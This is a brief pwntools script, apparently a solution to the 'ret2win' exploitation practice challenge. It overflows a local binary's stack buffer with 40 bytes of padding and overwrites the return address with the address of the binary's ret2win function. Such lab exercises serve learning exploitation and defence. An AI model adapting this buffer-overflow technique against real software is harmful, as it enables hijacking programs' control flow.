from pwn import *
from pprint import pprint

context.binary = elf = ELF('./ret2win')

p = elf.process()
gdb.attach(p)

offset = 40

payload = b'A'*40 + p64(elf.sym['ret2win'])

p.recv()
p.sendline(payload)

log.info(p.recvall())

